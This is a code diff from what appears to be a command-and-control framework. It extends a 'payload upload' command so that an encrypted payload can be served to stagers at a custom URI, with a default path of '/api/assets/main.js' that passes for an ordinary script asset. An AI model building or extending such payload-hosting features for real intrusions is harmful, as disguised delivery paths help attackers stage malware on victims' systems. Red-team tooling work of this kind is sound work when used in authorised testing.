@@ -3045,7 +3045,19 @@ Use 'download' command or access the file directly from the server.
             if len(command_parts) < 3:
                 return help.get_payload_upload_help_display(), 'error'
 
-            local_file_path = command_parts[2]
+            # Check for dynamic URI parameter
+            local_file_path = None
+            dynamic_uri = None
+
+            # Parse arguments: payload upload upload <file_path> [uri=<dynamic_uri>]
+            for i, part in enumerate(command_parts[2:], start=2):
+                if part.startswith('uri='):
+                    dynamic_uri = part.split('=', 1)[1]
+                else:
+                    local_file_path = part
+
+            if not local_file_path:
+                return f" Local file path is required", 'error'
 
             import os
             if not os.path.exists(local_file_path):
@@ -3101,10 +3113,13 @@ Use 'download' command or access the file directly from the server.
 
                 encrypted_base64 = base64.b64encode(encrypted_content).decode('utf-8')
 
-                from core.payload_storage import set_uploaded_payload
+                from core.payload_storage import set_uploaded_payload_with_uri
 
-                if set_uploaded_payload(encrypted_base64, filename):
-                    return f" Payload {filename} ({file_size} bytes) uploaded and encrypted successfully!", 'success'
+                if set_uploaded_payload_with_uri(encrypted_base64, filename, dynamic_uri):
+                    if dynamic_uri:
+                        return f" Payload {filename} ({file_size} bytes) uploaded and encrypted successfully! Available at dynamic URI: /{dynamic_uri}", 'success'
+                    else:
+                        return f" Payload {filename} ({file_size} bytes) uploaded and encrypted successfully!", 'success'
                 else:
                     return " Failed to store payload in centralized storage", 'error'
 
@@ -3114,16 +3129,18 @@ Use 'download' command or access the file directly from the server.
 
         elif action == 'status':
             try:
-                from core.payload_storage import get_uploaded_payload
-                payload_data, payload_filename = get_uploaded_payload()
+                from core.payload_storage import get_uploaded_payload_with_uri
+                payload_data, payload_filename, payload_uri = get_uploaded_payload_with_uri()
 
                 if payload_data is not None:
                     size = len(payload_data) if payload_data else 0
+                    uri_info = f"  URI: /{payload_uri}" if payload_uri else "  URI: /api/assets/main.js (default)"
                     output = f"""
 UPLOADED PAYLOAD STATUS:
   Status: Available
   Filename: {payload_filename}
   Size: {size} characters (base64)
+  {uri_info}
   Ready for use with stagers
                     """.strip()
                     return output, 'success'
